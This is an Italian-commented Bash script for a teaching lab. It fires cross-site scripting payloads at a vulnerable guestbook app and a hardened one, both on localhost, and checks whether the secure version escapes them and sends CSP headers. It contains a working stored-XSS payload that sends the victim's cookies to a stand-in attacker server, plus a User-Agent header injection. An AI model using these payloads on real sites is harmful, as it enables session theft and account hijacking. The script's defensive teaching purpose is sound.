#!/usr/bin/env bash
# Esegue automaticamente i payload XSS contro app vulnerable e secure
# e mostra l'output rilevante. Solo per uso didattico in lab.
set -euo pipefail

VULN_URL="${VULN_URL:-http://localhost:8080}"
SECURE_URL="${SECURE_URL:-http://localhost:8081}"
ATTACKER_URL="${ATTACKER_URL:-http://localhost:9000}"

echo "==> Reset stato (vuln guestbook, secure guestbook, attacker log)"
curl -s -X POST "$VULN_URL/reset" >/dev/null || true
curl -s -X POST "$SECURE_URL/reset" >/dev/null || true
curl -s -X POST "$ATTACKER_URL/reset" >/dev/null || true

echo
echo "==> 1) Stored XSS contro VULNERABLE (/guestbook)"
PAYLOAD='<script>new Image().src="http://localhost:9000/steal?c="+encodeURIComponent(document.cookie)</script>'
curl -s -X POST "$VULN_URL/guestbook" \
  -d "author=mallory" \
  --data-urlencode "body=$PAYLOAD" >/dev/null
echo "Commento iniettato. Estratto della pagina /guestbook:"
curl -s "$VULN_URL/guestbook" | grep -oE '<script>[^<]*</script>' || echo "(nessun tag script trovato)"

echo
echo "==> 2) Stesso payload contro SECURE (/guestbook)"
curl -s -X POST "$SECURE_URL/guestbook" \
  -d "author=mallory" \
  --data-urlencode "body=$PAYLOAD" >/dev/null
echo "Estratto della pagina /guestbook (secure):"
SECURE_BODY=$(curl -s "$SECURE_URL/guestbook")
echo "$SECURE_BODY" | grep -oE '<div>&lt;script&gt;.*&lt;/script&gt;</div>' \
  | sed 's,<div>,,; s,</div>,,'
if echo "$SECURE_BODY" | grep -qE '<script>[^<]*new Image'; then
  echo "ATTENZIONE: la versione secure ha servito uno script eseguibile (escape fallito)."
else
  echo "OK: la versione secure ha servito il payload come testo HTML-escaped (non eseguibile)."
fi

echo
echo "==> 3) HTTP Header XSS contro VULNERABLE (/welcome)"
curl -s -A '<script>alert("ua-vuln")</script>' "$VULN_URL/welcome" \
  | grep -oE '<script>[^<]*</script>' || echo "(nessun tag script trovato)"

echo
echo "==> 4) Stesso payload contro SECURE (/welcome)"
echo "(con sanitizzazione UA + autoescape lo script viene rimosso/scappato)"
curl -s -A '<script>alert("ua-secure")</script>' "$SECURE_URL/welcome" \
  | grep -oE 'User-Agent.*' | head -1

echo
echo "==> Header di risposta di SECURE (CSP & co.)"
curl -s -I "$SECURE_URL/welcome" | grep -iE 'content-security|x-content|x-frame|referrer|permissions'

echo
echo "==> Apri http://localhost:9000 per vedere i cookie esfiltrati dalla versione vulnerabile."
